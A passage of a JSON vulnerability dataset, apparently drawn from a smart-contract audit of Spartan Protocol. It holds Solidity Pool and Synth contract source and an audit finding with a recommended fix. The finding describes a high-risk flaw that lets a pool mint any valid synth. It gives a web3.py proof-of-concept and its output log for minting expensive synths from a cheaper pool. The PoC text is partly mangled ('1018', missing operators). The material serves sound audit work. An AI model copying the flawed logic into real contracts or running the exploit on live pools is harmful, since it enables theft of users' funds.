        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iSYNTH.sol\"; \nimport \"./interfaces/iSYNTHFACTORY.sol\"; \nimport \"./interfaces/iBEP677.sol\"; \n\ncontract Pool is iBEP20 {  \n    address public BASE;\n    address public TOKEN;\n    address public DEPLOYER;\n\n    string _name; string _symbol;\n    uint8 public override decimals; uint256 public override totalSupply;\n    mapping(address => uint) private _balances;\n    mapping(address => mapping(address => uint)) private _allowances;\n\n    uint256 public baseAmount; // SPARTA amount that should be in the pool\n    uint256 public tokenAmount; // TOKEN amount that should be in the pool\n\n    uint private lastMonth; // Timestamp of the start of current metric period (For UI)\n    uint public genesis; // Timestamp from when the pool was first deployed (For UI)\n\n    uint256 public map30DPoolRevenue; // Tally of revenue during current incomplete metric period (for UI)\n    uint256 public mapPast30DPoolRevenue; // Tally of revenue from last full metric period (for UI)\n    uint256 [] public revenueArray; // Array of the last two metric periods (For UI)\n\n    event AddLiquidity(address indexed member, uint inputBase, uint inputToken, uint unitsIssued);\n    event RemoveLiquidity(address indexed member, uint outputBase, uint outputToken, uint unitsClaimed);\n    event Swapped(address indexed tokenFrom, address indexed tokenTo, address indexed recipient, uint inputAmount, uint outputAmount, uint fee);\n    event MintSynth(address indexed member, address indexed base, uint256 baseAmount, address indexed token, uint256 synthAmount);\n    event BurnSynth(address indexed member, address indexed base, uint256 baseAmount, address indexed token, uint256 synthAmount);\n\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    constructor (address _base, address _token) {\n        BASE = _base;\n        TOKEN = _token;\n        string memory poolName = \"-SpartanProtocolPool\";\n        string memory poolSymbol = \"-SPP\";\n        _name = string(abi.encodePacked(iBEP20(_token).name(), poolName));\n        _symbol = string(abi.encodePacked(iBEP20(_token).symbol(), poolSymbol));\n        decimals = 18;\n        genesis = block.timestamp;\n        DEPLOYER = msg.sender;\n        lastMonth = 0;\n    }\n\n    //========================================iBEP20=========================================//\n\n    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function transfer(address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender]+(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {\n        uint256 currentAllowance = _allowances[msg.sender][spender];\n        require(currentAllowance >= subtractedValue, \"!approval\");\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"!owner\");\n        require(spender != address(0), \"!spender\");\n        if (_allowances[owner][spender] < type(uint256).max) { // No need to re-approve if already max\n            _allowances[owner][spender] = amount;\n            emit Approval(owner, spender, amount);\n        }\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        // Max approval (saves an SSTORE)\n        if (_allowances[sender][msg.sender] < type(uint256).max) {\n            uint256 currentAllowance = _allowances[sender][msg.sender];\n            require(currentAllowance >= amount, \"!approval\");\n            _approve(sender, msg.sender, currentAllowance - amount);\n        }\n        return true;\n    }\n\n    //iBEP677 approveAndCall\n    function approveAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n      _approve(msg.sender, recipient, type(uint256).max); // Give recipient max approval\n      iBEP677(recipient).onTokenApproval(address(this), amount, msg.sender, data); // Amount is passed thru to recipient\n      return true;\n    }\n\n    //iBEP677 transferAndCall\n    function transferAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n      _transfer(msg.sender, recipient, amount);\n      iBEP677(recipient).onTokenTransfer(address(this), amount, msg.sender, data); // Amount is passed thru to recipient \n      return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"!sender\");\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"!balance\");\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    function burn(uint256 amount) external virtual override {\n        _burn(msg.sender, amount);\n    }\n\n    function burnFrom(address account, uint256 amount) external virtual {  \n        uint256 decreasedAllowance = allowance(account, msg.sender) - (amount);\n        _approve(account, msg.sender, decreasedAllowance); \n        _burn(account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        require(_balances[account] >= amount, \"!balance\");\n        _balances[account] -= amount;\n        totalSupply -= amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    //====================================POOL FUNCTIONS =================================//\n\n    // User adds liquidity to the pool\n    function add() external returns(uint liquidityUnits){\n        liquidityUnits = addForMember(msg.sender);\n        return liquidityUnits;\n    }\n\n    // Contract adds liquidity for user \n    function addForMember(address member) public returns(uint liquidityUnits){\n        uint256 _actualInputBase = _getAddedBaseAmount(); // Get the received SPARTA amount\n        uint256 _actualInputToken = _getAddedTokenAmount(); // Get the received TOKEN amount\n        if(baseAmount == 0 || tokenAmount == 0){\n        require(_actualInputBase != 0 && _actualInputToken != 0, \"!Balanced\");\n        }\n        liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnits(_actualInputBase, baseAmount, _actualInputToken, tokenAmount, totalSupply); // Calculate LP tokens to mint\n        _incrementPoolBalances(_actualInputBase, _actualInputToken); // Update recorded BASE and TOKEN amounts\n        _mint(member, liquidityUnits); // Mint the LP tokens directly to the user\n        emit AddLiquidity(member, _actualInputBase, _actualInputToken, liquidityUnits);\n        return liquidityUnits;\n    }\n    \n    // User removes liquidity from the pool \n    function remove() external returns (uint outputBase, uint outputToken) {\n        return removeForMember(msg.sender);\n    } \n\n    // Contract removes liquidity for the user\n    function removeForMember(address member) public returns (uint outputBase, uint outputToken) {\n        uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount\n        outputBase = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units\n        outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units\n        _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts\n        _burn(address(this), _actualInputUnits); // Burn the LP tokens\n        iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user\n        iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user\n        emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);\n        return (outputBase, outputToken);\n    }\n\n    // Caller swaps tokens\n    function swap(address token) external returns (uint outputAmount, uint fee){\n        (outputAmount, fee) = swapTo(token, msg.sender);\n        return (outputAmount, fee);\n    }\n\n    // Contract swaps tokens for the member\n    function swapTo(address token, address member) public payable returns (uint outputAmount, uint fee) {\n        require((token == BASE || token == TOKEN), \"!BASE||TOKEN\"); // Must be SPARTA or the pool's relevant TOKEN\n        address _fromToken; uint _amount;\n        if(token == BASE){\n            _fromToken = TOKEN; // If SPARTA is selected; swap from TOKEN\n            _amount = _getAddedTokenAmount(); // Get the received TOKEN amount\n            (outputAmount, fee) = _swapTokenToBase(_amount); // Calculate the SPARTA output from the swap\n        } else {\n            _fromToken = BASE; // If TOKEN is selected; swap from SPARTA\n            _amount = _getAddedBaseAmount(); // Get the received SPARTA amount\n            (outputAmount, fee) = _swapBaseToToken(_amount); // Calculate the TOKEN output from the swap\n        }\n        emit Swapped(_fromToken, token, member, _amount, outputAmount, fee);\n        iBEP20(token).transfer(member, outputAmount); // Transfer the swap output to the selected user\n        return (outputAmount, fee);\n    }\n\n    // Swap SPARTA for Synths\n    function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, \"!synth\"); // Must be a valid Synth\n        uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount\n        uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); // Calculate value of swapping SPARTA to the relevant underlying TOKEN\n        uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted\n        _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount\n        uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN\n        fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA\n        _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold\n        iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user\n        _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n        emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);\n      return (output, fee);\n    }\n    \n    // Swap Synths for SPARTA\n    function burnSynth(address synthIN, address member) external returns(uint outputAmount, uint fee) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthIN) == true, \"!synth\"); // Must be a valid Synth\n        uint _actualInputSynth = iBEP20(synthIN).balanceOf(address(this)); // Get received SYNTH amount\n        uint outputBase = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputSynth, tokenAmount, baseAmount); // Calculate value of swapping relevant underlying TOKEN to SPARTA\n        fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputSynth, tokenAmount, baseAmount); // Calc slip fee in SPARTA\n        iBEP20(synthIN).transfer(synthIN, _actualInputSynth); // Transfer SYNTH to relevant synth contract\n        iSYNTH(synthIN).burnSynth(); // Burn the SYNTH units\n        _decrementPoolBalances(outputBase, 0); // Update recorded SPARTA amount\n        iBEP20(BASE).transfer(member, outputBase); // Transfer SPARTA to user\n        _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n        emit BurnSynth(member, BASE, outputBase, TOKEN, _actualInputSynth);\n      return (outputBase, fee);\n    }\n\n    //=======================================INTERNAL MATHS======================================//\n\n    // Check the SPARTA amount received by this Pool\n    function _getAddedBaseAmount() internal view returns(uint256 _actual){\n        uint _baseBalance = iBEP20(BASE).balanceOf(address(this)); \n        if(_baseBalance > baseAmount){\n            _actual = _baseBalance-(baseAmount);\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n  \n    // Check the TOKEN amount received by this Pool\n    function _getAddedTokenAmount() internal view returns(uint256 _actual){\n        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); \n        if(_tokenBalance > tokenAmount){\n            _actual = _tokenBalance-(tokenAmount);\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n\n    // Calculate output of swapping SPARTA for TOKEN & update recorded amounts\n    function _swapBaseToToken(uint256 _x) internal returns (uint256 _y, uint256 _fee){\n        uint256 _X = baseAmount;\n        uint256 _Y = tokenAmount;\n        _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output\n        uint fee = iUTILS(_DAO().UTILS()).calcSwapFee(_x, _X, _Y); // Calc TOKEN fee\n        _fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, fee); // Convert TOKEN fee to SPARTA\n        _setPoolAmounts(_X + _x, _Y - _y); // Update recorded BASE and TOKEN amounts\n        _addPoolMetrics(_fee); // Add slip fee to the revenue metrics\n        return (_y, _fee);\n    }\n\n    // Calculate output of swapping TOKEN for SPARTA & update recorded amounts\n    function _swapTokenToBase(uint256 _x) internal returns (uint256 _y, uint256 _fee){\n        uint256 _X = tokenAmount;\n        uint256 _Y = baseAmount;\n        _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc SPARTA output\n        _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_x, _X, _Y); // Calc SPARTA fee\n        _setPoolAmounts(_Y - _y, _X + _x); // Update recorded BASE and TOKEN amounts\n        _addPoolMetrics(_fee); // Add slip fee to the revenue metrics\n        return (_y, _fee);\n    }\n\n    //=======================================BALANCES=========================================//\n\n    // Sync internal balances to actual\n    function sync() external {\n        baseAmount = iBEP20(BASE).balanceOf(address(this));\n        tokenAmount = iBEP20(TOKEN).balanceOf(address(this));\n    }\n\n    // Increment internal balances\n    function _incrementPoolBalances(uint _baseAmount, uint _tokenAmount) internal  {\n        baseAmount += _baseAmount;\n        tokenAmount += _tokenAmount;\n    }\n\n    // Set internal balances\n    function _setPoolAmounts(uint256 _baseAmount, uint256 _tokenAmount) internal  {\n        baseAmount = _baseAmount;\n        tokenAmount = _tokenAmount; \n    }\n\n    // Decrement internal balances\n    function _decrementPoolBalances(uint _baseAmount, uint _tokenAmount) internal  {\n        baseAmount -= _baseAmount;\n        tokenAmount -= _tokenAmount; \n    }\n\n    //===========================================POOL FEE ROI=================================//\n\n    function _addPoolMetrics(uint256 _fee) internal {\n        if(lastMonth == 0){\n            lastMonth = block.timestamp;\n        }\n        if(block.timestamp <= lastMonth + 2592000){ // 30Days\n            map30DPoolRevenue = map30DPoolRevenue+(_fee);\n        } else {\n            lastMonth = block.timestamp;\n            mapPast30DPoolRevenue = map30DPoolRevenue;\n            addRevenue(mapPast30DPoolRevenue);\n            map30DPoolRevenue = 0;\n            map30DPoolRevenue = map30DPoolRevenue+(_fee);\n        }\n    }\n\n    function addRevenue(uint _totalRev) internal {\n        if(!(revenueArray.length == 2)){\n            revenueArray.push(_totalRev);\n        } else {\n            addFee(_totalRev);\n        }\n    }\n\n    function addFee(uint _rev) internal {\n        uint _n = revenueArray.length; // 2\n        for (uint i = _n - 1; i > 0; i--) {\n            revenueArray[i] = revenueArray[i - 1];\n        }\n        revenueArray[0] = _rev;\n    }\n}\n\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./Pool.sol\";  \nimport \"./interfaces/iPOOLFACTORY.sol\";\n\ncontract Synth is iBEP20 {\n    address public BASE;\n    address public LayerONE; // Underlying relevant layer1 token\n    uint public genesis;\n    address public DEPLOYER;\n\n    string _name; string _symbol;\n    uint8 public override decimals; uint256 public override totalSupply;\n\n    mapping(address => uint) private _balances;\n    mapping(address => mapping(address => uint)) private _allowances;\n    mapping(address => uint) public mapSynth_LPBalance;\n    mapping(address => uint) public mapSynth_LPDebt;\n   \n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n    \n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == DEPLOYER, \"!DAO\");\n        _;\n    }\n\n    // Restrict access\n    modifier onlyPool() {\n        require(iPOOLFACTORY(_DAO().POOLFACTORY()).isCuratedPool(msg.sender) == true, \"!curated\");\n        _;\n    }\n    \n    constructor (address _base, address _token) {\n        BASE = _base;\n        LayerONE = _token;\n        string memory synthName = \"-SpartanProtocolSynthetic\";\n        string memory synthSymbol = \"-SPS\";\n        _name = string(abi.encodePacked(iBEP20(_token).name(), synthName));\n        _symbol = string(abi.encodePacked(iBEP20(_token).symbol(), synthSymbol));\n        decimals = iBEP20(_token).decimals();\n        DEPLOYER = msg.sender;\n        genesis = block.timestamp;\n    }\n\n    //========================================iBEP20=========================================//\n\n    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    // iBEP20 Transfer function\n    function transfer(address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    // iBEP20 Approve, change allowance functions\n    function approve(address spender, uint256 amount) external virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender]+(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {\n        uint256 currentAllowance = _allowances[msg.sender][spender];\n        require(currentAllowance >= subtractedValue, \"!approval\");\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"!owner\");\n        require(spender != address(0), \"!spender\");\n        if (_allowances[owner][spender] < type(uint256).max) { // No need to re-approve if already max\n            _allowances[owner][spender] = amount;\n            emit Approval(owner, spender, amount);\n        }\n    }\n    \n    // iBEP20 TransferFrom function\n    function transferFrom(address sender, address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        // Unlimited approval (saves an SSTORE)\n        if (_allowances[sender][msg.sender] < type(uint256).max) {\n            uint256 currentAllowance = _allowances[sender][msg.sender];\n            require(currentAllowance >= amount, \"!approval\");\n            _approve(sender, msg.sender, currentAllowance - amount);\n        }\n        return true;\n    }\n\n    //iBEP677 approveAndCall\n    function approveAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n        _approve(msg.sender, recipient, type(uint256).max); // Give recipient max approval\n        iBEP677(recipient).onTokenApproval(address(this), amount, msg.sender, data); // Amount is passed thru to recipient\n        return true;\n    }\n\n    //iBEP677 transferAndCall\n    function transferAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        iBEP677(recipient).onTokenTransfer(address(this), amount, msg.sender, data); // Amount is passed thru to recipient \n        return true;\n    }\n\n    // Internal transfer function\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"!sender\");\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"!balance\");\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    // Internal mint (upgrading and daily emissions)\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    // Burn supply\n    function burn(uint256 amount) external virtual override {\n        _burn(msg.sender, amount);\n    }\n\n    function burnFrom(address account, uint256 amount) external virtual {  \n        uint256 decreasedAllowance = allowance(account, msg.sender) - (amount);\n        _approve(account, msg.sender, decreasedAllowance); \n        _burn(account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        require(_balances[account] >= amount, \"!balance\");\n        _balances[account] -= amount;\n        totalSupply -= amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    //==================================== SYNTH FUNCTIONS =================================//\n\n    // Handle received LP tokens and mint Synths\n    function mintSynth(address member, uint amount) external onlyPool returns (uint syntheticAmount){\n        uint lpUnits = _getAddedLPAmount(msg.sender); // Get the received LP units\n        mapSynth_LPDebt[msg.sender] += amount; // Increase debt by synth amount\n        mapSynth_LPBalance[msg.sender] += lpUnits; // Increase lp balance by LPs received\n        _mint(member, amount); // Mint the synths & tsf to user\n        return amount;\n    }\n    \n    // Handle received Synths and burn the LPs and Synths\n    function burnSynth() external returns (bool){\n        uint _syntheticAmount = balanceOf(address(this)); // Get the received synth units\n        uint _amountUnits = (_syntheticAmount * mapSynth_LPBalance[msg.sender]) / mapSynth_LPDebt[msg.sender]; // share = amount * part/total\n        mapSynth_LPBalance[msg.sender] -= _amountUnits; // Reduce lp balance\n        mapSynth_LPDebt[msg.sender] -= _syntheticAmount; // Reduce debt by synths being burnt\n        if(_amountUnits > 0){\n            _burn(address(this), _syntheticAmount); // Burn the synths\n            Pool(msg.sender).burn(_amountUnits); // Burn the LP tokens\n        }\n        return true;\n    }\n\n    // Burn LPs to if their value outweights the synths supply value (Ensures incentives are funnelled to existing LPers)\n    function realise(address pool) external {\n        uint baseValueLP = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(mapSynth_LPBalance[pool], BASE, pool); // Get the SPARTA value of the LP tokens\n        uint baseValueSynth = iUTILS(_DAO().UTILS()).calcActualSynthUnits(mapSynth_LPDebt[pool], address(this)); // Get the SPARTA value of the synths\n        if(baseValueLP > baseValueSynth){\n            uint premium = baseValueLP - baseValueSynth; // Get the premium between the two values\n            if(premium > 10**18){\n                uint premiumLP = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(premium, pool); // Get the LP value of the premium\n                mapSynth_LPBalance[pool] -= premiumLP; // Reduce the LP balance\n                Pool(pool).burn(premiumLP); // Burn the premium of the LP tokens\n            }\n        }\n    }\n\n    // Check the received token amount\n    function _handleTransferIn(address _token, uint256 _amount) internal returns(uint256 _actual){\n        if(_amount > 0) {\n            uint startBal = iBEP20(_token).balanceOf(address(this)); // Get existing balance\n            iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer tokens in\n            _actual = iBEP20(_token).balanceOf(address(this)) - startBal; // Calculate received amount\n        }\n        return _actual;\n    }\n\n    // Check the received LP tokens amount\n    function _getAddedLPAmount(address _pool) internal view returns(uint256 _actual){\n        uint _lpCollateralBalance = iBEP20(_pool).balanceOf(address(this)); // Get total balance held\n        if(_lpCollateralBalance > mapSynth_LPBalance[_pool]){\n            _actual = _lpCollateralBalance - mapSynth_LPBalance[_pool]; // Get received amount\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n\n    function getmapAddress_LPBalance(address pool) external view returns (uint){\n        return mapSynth_LPBalance[pool];\n    }\n\n    function getmapAddress_LPDebt(address pool) external view returns (uint){\n        return mapSynth_LPDebt[pool];\n    }\n}\n\n\n",
        "CodeNames": [
            "Pool.sol",
            "Synth.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-09",
                "Location": [
                    "python\nsparta_amount = 100 * 1018\ninitail_link_synth = link_synth.functions.balanceOf(user).call()\nbase.functions.transfer(link_pool.address, sparta_amount).transact({'from': user})\nlink_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})\nafter_link_synth = link_synth.functions.balanceOf(user).call()\n\nprint('get link synth amount from link pool:', after_link_synth initail_link_synth)\n\nsparta_amount = 100 * 1018\ninitail_link_synth = link_synth.functions.balanceOf(user).call()\nbase.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user})\ndai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})\nafter_link_synth = link_synth.functions.balanceOf(user).call()\n\nprint('get link synth amount from dai pool:', after_link_synth initail_link_synth)\n\n",
                    "//solidity\nget link synth amount from link pool: 97078046905036524413\nget link synth amount from dai pool: 970780469050365244136\n"
                ],
                "Type": " arbitrary synth mint/burn from pool",
                "Description": "\nPool can mint arbitrary Synth provided as long as it's a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.\n\nPool's mintSynth logic(https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229-L242), Synth's mintSynth logic(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L165-L171), and Synth's authorization logic(https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242).\n\n\nThe price of the synthetics to be mint is calculated in Pool based on the AMM price of the current Pool\n\nHere's a web3.py script of minting arbitrary Synth in a pool.\nFor simplicity, two pools are set with the assumption that link is 10x expensive than dai.\n\npython\nsparta_amount = 100 * 1018\ninitail_link_synth = link_synth.functions.balanceOf(user).call()\nbase.functions.transfer(link_pool.address, sparta_amount).transact({'from': user})\nlink_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})\nafter_link_synth = link_synth.functions.balanceOf(user).call()\n\nprint('get link synth amount from link pool:', after_link_synth initail_link_synth)\n\nsparta_amount = 100 * 1018\ninitail_link_synth = link_synth.functions.balanceOf(user).call()\nbase.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user})\ndai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})\nafter_link_synth = link_synth.functions.balanceOf(user).call()\n\nprint('get link synth amount from dai pool:', after_link_synth initail_link_synth)\n\n\n\nThe log of the above script\nsolidity\nget link synth amount from link pool: 97078046905036524413\nget link synth amount from dai pool: 970780469050365244136\n\n",
                "Repair": "Recommend Checking the provided synth's underlying token in mintSynth\nsolidity\nrequire(iSYNTH(synthOut).LayerONE() == TOKEN, \"invalid synth\");\n\n\nverifyfirst (Spartan) confirmed(https://github.com/code-423n4/2021-07-spartan-findings/issues/20#issuecomment-883837548):\n  We agree and appreciate this finding being valid high risk issue.\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iDAO.sol\";\nimport \"./Pool.sol\";  \n\ncontract PoolFactory { \n    address public BASE;\n    address public WBNB;\n    address public DEPLOYER;\n    uint public curatedPoolSize;    // Max amount of pools that can be curated status\n    address[] public arrayPools;    // Array of all deployed pools\n    address[] public arrayTokens;   // Array of all listed tokens\n\n    mapping(address=>address) private mapToken_Pool;\n    mapping(address=>bool) public isListedPool;\n    mapping(address=>bool) public isCuratedPool;\n\n    event CreatePool(address indexed token, address indexed pool);\n    event AddCuratePool(address indexed pool, bool Curated);\n    event RemoveCuratePool(address indexed pool, bool Curated);\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == DEPLOYER || msg.sender == _DAO().DAO());\n        _;\n    }\n\n    constructor (address _base, address _wbnb) {\n        BASE = _base;\n        WBNB = _wbnb;\n        curatedPoolSize = 10;\n        DEPLOYER = msg.sender;\n    }\n\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() external onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Anyone can create a pool and add liquidity at the same time\n    function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){\n        require(getPool(token) == address(0)); // Must be a valid token\n        require((inputToken > 0 && inputBase >= (10000*10**18)), \"!min\"); // User must add at least 10,000 SPARTA liquidity & ratio must be finite\n        Pool newPool; address _token = token;\n        if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB\n        require(_token != BASE && iBEP20(_token).decimals() == 18); // Token must not be SPARTA & it's decimals must be 18\n        newPool = new Pool(BASE, _token); // Deploy new pool\n        pool = address(newPool); // Get address of new pool\n        mapToken_Pool[_token] = pool; // Record the new pool address in PoolFactory\n        _handleTransferIn(BASE, inputBase, pool); // Transfer SPARTA liquidity to new pool\n        _handleTransferIn(token, inputToken, pool); // Transfer TOKEN liquidity to new pool\n        arrayPools.push(pool); // Add pool address to the pool array\n        arrayTokens.push(_token); // Add token to the listed array\n        isListedPool[pool] = true; // Record pool as currently listed\n        Pool(pool).addForMember(msg.sender); // Perform the liquidity-add for the user\n        emit CreatePool(token, pool);\n        return pool;\n    }\n\n    // Can create pools initially with no liquidity (not public)\n    function createPool(address token) external onlyDAO returns(address pool){\n        require(getPool(token) == address(0)); // Must be a valid token\n        Pool newPool; address _token = token;\n        if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB\n        newPool = new Pool(BASE, _token); // Deploy new pool\n        pool = address(newPool); // Get address of new pool\n        mapToken_Pool[_token] = pool; // Record the new pool address in PoolFactory\n        arrayPools.push(pool); // Add pool address to the pool array\n        arrayTokens.push(_token); // Add token to the listed array\n        isListedPool[pool] = true; // Record pool as currently listed\n        emit CreatePool(token, pool);\n        return pool;\n    }\n\n    // Add pool to the Curated list, enabling it's synths & dividends & dao/vault weight\n    function addCuratedPool(address token) external onlyDAO {\n        require(token != BASE); // Token must not be SPARTA\n        address _pool = getPool(token); // Get pool address\n        require(isListedPool[_pool] == true); // Pool must be valid\n        require(curatedPoolCount() < curatedPoolSize, \"maxCurated\"); // Must be room in the Curated list\n        isCuratedPool[_pool] = true; // Record pool as Curated\n        emit AddCuratePool(_pool, isCuratedPool[_pool]);\n    }\n\n    // Remove pool from the Curated list\n    function removeCuratedPool(address token) external onlyDAO {\n        require(token != BASE); // Token must not be SPARTA\n        address _pool = getPool(token); // Get pool address\n        require(isCuratedPool[_pool] == true); // Pool must be Curated\n        isCuratedPool[_pool] = false; // Record pool as not curated\n        emit RemoveCuratePool(_pool, isCuratedPool[_pool]);\n    }\n\n    function curatedPoolCount() internal view returns (uint){\n        uint cPoolCount; \n        for(uint i = 0; i< arrayPools.length; i++){\n            if(isCuratedPool[arrayPools[i]] == true){\n                cPoolCount += 1;\n            }\n        }\n        return cPoolCount;\n    }\n\n    // Transfer assets into new pool\n    function _handleTransferIn(address _token, uint256 _amount, address _pool) internal returns(uint256 actual){\n        if(_amount > 0) {\n            uint startBal = iBEP20(_token).balanceOf(_pool); \n      